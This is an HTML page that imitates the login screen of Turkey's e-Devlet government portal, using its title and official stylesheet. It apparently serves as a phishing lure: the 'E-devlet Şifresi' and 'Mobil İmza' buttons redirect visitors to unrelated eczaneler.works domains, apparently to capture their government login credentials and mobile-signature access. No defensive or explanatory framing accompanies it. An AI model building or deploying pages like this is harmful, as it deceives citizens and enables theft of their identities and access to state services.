<!DOCTYPE html>
<html lang="tr" data-theme="">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>e-Devlet Kapısı</title>
    <link rel="stylesheet" href="https://cdn.e-devlet.gov.tr/themes/izmir/css/login-main.1.9.5.css">
</head>

<body data-lang="tr_TR.UTF-8">
<div class="wrapper">
    <div class="container">
        <main>
            <section>
                <div class="content">
                    <form method="post" id="loginForm" name="sifreGirisForm" autocomplete="off">
                        <fieldset>
                            <div class="form-row center-item">
                                <button onclick="location.href='https://eczaneler.works/';" class="btn btn-send" name="submitButton" type="button" value="E-devlet Şifresi">E-devlet Şifresi</button>
                            </div>
                            <div class="form-row center-item">
                                <button onclick="location.href='https://e-dergi.eczaneler.works/';" class="btn btn-send" name="submitButton" type="button" value="Mobil İmza">Mobil İmza</button>
                            </div>
                            <div class="form-row center-item">
                                <button type="button" class="btn btn-cancel" name="cancelButton" value="İptal">İptal</button>
                                <button class="btn btn-send" name="submitButton" type="submit" value="Giriş Yap">Giriş Yap</button>
                            </div>
                        </fieldset>
                    </form>
                </div>
            </section>
        </main>
    </div>
</div>
</body>
</html>
